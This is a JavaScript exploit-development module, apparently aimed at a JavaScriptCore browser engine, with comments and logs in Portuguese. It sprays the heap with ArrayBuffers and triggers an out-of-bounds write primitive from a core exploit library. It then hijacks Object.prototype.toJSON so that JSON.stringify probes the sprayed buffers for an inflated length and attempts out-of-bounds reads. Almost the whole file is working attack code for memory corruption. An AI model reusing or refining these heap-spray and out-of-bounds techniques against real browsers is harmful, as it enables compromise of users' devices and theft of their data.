// js/script3/testHeapSprayAndCorrupt.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// toJSON que sonda 'this' (ArrayBuffer) e tenta R/W OOB se o tamanho estiver inflado
// Esta é a v3 que se mostrou estável.
export function toJSON_AttemptWriteToThis_v3() { 
    let initial_buffer_size_for_oob_check;
    const original_sprayed_ab_size = 64; // Tamanho dos ArrayBuffers pulverizados

    // Determina o tamanho original esperado do buffer 'this'
    if (typeof oob_array_buffer_real !== 'undefined' && this === oob_array_buffer_real) {
        initial_buffer_size_for_oob_check = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
    } else {
        // Assume que 'this' é um dos sprayed_victim_array
        initial_buffer_size_for_oob_check = original_sprayed_ab_size; 
    }

    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis_v3",
        this_type: "N/A",
        this_byteLength_prop: "N/A",
        dataview_created: false,
        internal_write_val: null,
        internal_read_val: null,
        internal_rw_match: false,
        error_in_toJSON: null,
        oob_read_offset_attempted: "N/A",
        oob_read_value_attempted: "N/A"
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);
        
        try {
            result_payload.this_byteLength_prop = this.byteLength;
        } catch (e_bl) {
            result_payload.this_byteLength_prop = `Error accessing byteLength: ${e_bl.name}`;
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `ByteLength Access Error: ${e_bl.message}; `;
        }

        if (this instanceof ArrayBuffer) {
            let current_this_byteLength = result_payload.this_byteLength_prop;
            if (typeof current_this_byteLength !== 'number') {
                result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Cannot proceed, this.byteLength is not a number (val: ${current_this_byteLength}).`;
                return result_payload;
            }

            if (current_this_byteLength >= 4) {
                try {
                    let dv_internal = new DataView(this, 0, Math.min(current_this_byteLength, 8));
                    result_payload.dataview_created = true;
                    
                    const val_to_write_internal = 0xABABABAB;
                    dv_internal.setUint32(0, val_to_write_internal, true);
                    result_payload.internal_write_val = toHex(val_to_write_internal);
                    
                    let read_back_internal = dv_internal.getUint32(0, true);
                    result_payload.internal_read_val = toHex(read_back_internal);
                    
                    if (read_back_internal === val_to_write_internal) {
                        result_payload.internal_rw_match = true;
                    }
                } catch (e_dv_internal) {
                    result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Internal DataView RW Error: ${e_dv_internal.name} - ${e_dv_internal.message}; `;
                }
            } else {
                 result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `this (ArrayBuffer) too small for internal RW test (size: ${current_this_byteLength}).`;
            }

            // Tentativa de Leitura OOB se o byteLength for MAIOR que o esperado para este buffer
            if (current_this_byteLength > initial_buffer_size_for_oob_check) {
                const oob_read_target_offset = initial_buffer_size_for_oob_check + 4; // Ler 4 bytes após o fim original esperado
                result_payload.oob_read_offset_attempted = toHex(oob_read_target_offset);
                try {
                    let dv_oob = new DataView(this); 
                    if (dv_oob.byteLength >= (oob_read_target_offset + 4)) { 
                        result_payload.oob_read_value_attempted = toHex(dv_oob.getUint32(oob_read_target_offset, true));
                    } else {
                        result_payload.oob_read_value_attempted = `DataView (actual size ${dv_oob.byteLength}) too small for OOB read at offset ${toHex(oob_read_target_offset)}.`;
                    }
                } catch (e_oob_r) {
                     result_payload.oob_read_value_attempted = `OOB Read Error @${result_payload.oob_read_offset_attempted}: ${e_oob_r.name}`;
                }
            } else {
                 result_payload.oob_read_offset_attempted = toHex(initial_buffer_size_for_oob_check + 4);
                 result_payload.oob_read_value_attempted = `Size not inflated (this: ${current_this_byteLength}b vs initial_expected: ${initial_buffer_size_for_oob_check}b), OOB read not applicable.`;
            }

        } else {
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + "this is not an ArrayBuffer.";
        }
    } catch (e_main) {
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}; `;
        if (typeof result_payload.this_byteLength_prop === 'string' && result_payload.this_byteLength_prop.startsWith("Error accessing")) {
        } else {
            result_payload.this_byteLength_prop = `Error during toJSON execution: ${e_main.message}`;
        }
    }
    return result_payload;
}


export async function executeHeapSprayAndCorruptTest() {
    const FNAME_TEST = "executeHeapSprayAndCorruptTest";
    logS3(`--- Iniciando Teste: Heap Spray, Corrupção OOB, e Sondagem de Vítimas ---`, "test", FNAME_TEST);
    document.title = `HeapSpray & Corrupt`;

    const spray_count = 200; // Número de ArrayBuffers para pulverizar
    const victim_size = 64;   // Tamanho de cada ArrayBuffer pulverizado
    const sprayed_victim_array = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} ArrayBuffers de ${victim_size} bytes cada...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_victim_array.push(new ArrayBuffer(victim_size));
        }
        logS3(`   Pulverização concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização do heap: ${e_spray.message}. Abortando teste.`, "error", FNAME_TEST);
        return;
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para estabilização do heap

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        // Limpar sprayed_victim_array para liberar memória se necessário
        sprayed_victim_array.length = 0;
        return;
    }

    try {
        logS3(`   Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        sprayed_victim_array.length = 0;
        return;
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa após corrupção

    logS3(`3. Sondando ${sprayed_victim_array.length} ArrayBuffers pulverizados via JSON.stringify...`, "test", FNAME_TEST);
    document.title = `Sondando ${sprayed_victim_array.length} ABs...`;

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let corrupted_victim_found = false;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_AttemptWriteToThis_v3,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`   PP aplicada com toJSON_AttemptWriteToThis_v3.`, "info", FNAME_TEST);

        for (let i = 0; i < sprayed_victim_array.length; i++) {
            const current_victim_ab = sprayed_victim_array[i];
            let stringifyResult = null;
            let errorInStringify = null;

            if (i > 0 && i % 20 === 0) { // Pausa a cada 20 para não sobrecarregar e permitir atualização da UI
                logS3(`   Sondando... ${i}/${sprayed_victim_array.length}`, 'info', FNAME_TEST);
                await PAUSE_S3(SHORT_PAUSE_S3);
            }

            try {
                stringifyResult = JSON.stringify(current_victim_ab);
            } catch (e_str) {
                errorInStringify = e_str;
                logS3(`   ERRO JSON.stringify no sprayed_victim_array[${i}]: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
            }

            if (errorInStringify) {
                // Se o próprio stringify falhar, já é um sinal
                corrupted_victim_found = true;
                logS3(`   !!!! CORRUPÇÃO GRAVE DETECTADA !!!! JSON.stringify falhou para sprayed_victim_array[${i}]`, "critical", FNAME_TEST);
                document.title = `CORRUPTED SPRAYED AB @ ${i}! (stringify err)`;
                break; 
            }
            
            if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
                if (stringifyResult.error_in_toJSON) {
                    corrupted_victim_found = true;
                    logS3(`   !!!! CORRUPÇÃO DETECTADA !!!! Erro dentro da toJSON para sprayed_victim_array[${i}]: ${stringifyResult.error_in_toJSON}`, "critical", FNAME_TEST);
                    logS3(`     Detalhes: type=${stringifyResult.this_type}, byteLength=${stringifyResult.this_byteLength_prop}`, "info", FNAME_TEST);
                    document.title = `CORRUPTED SPRAYED AB @ ${i}! (toJSON err)`;
                    break; 
                }
                if (typeof stringifyResult.this_byteLength_prop === 'number' && stringifyResult.this_byteLength_prop !== victim_size) {
                    corrupted_victim_found = true;
                    logS3(`   !!!! TAMANHO INESPERADO DETECTADO !!!! sprayed_victim_array[${i}].byteLength: ${stringifyResult.this_byteLength_prop} (esperado ${victim_size})`, "critical", FNAME_TEST);
                    logS3(`     Tentativa OOB Read: ${stringifyResult.oob_read_value_attempted}`, "leak", FNAME_TEST);
                    document.title = `CORRUPTED SPRAYED AB @ ${i}! (size ${stringifyResult.this_byteLength_prop})`;
                    break; 
                }
            }
        } // end for loop

    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!corrupted_victim_found) {
        logS3("Nenhuma corrupção óbvia detectada nos ArrayBuffers pulverizados após a escrita OOB.", "good", FNAME_TEST);
    }

    logS3(`--- Teste Heap Spray, Corrupção OOB, e Sondagem CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_victim_array.length = 0; // Limpar array para liberar memória
    document.title = corrupted_victim_found ? document.title : `HeapSpray & Corrupt Done`;
}
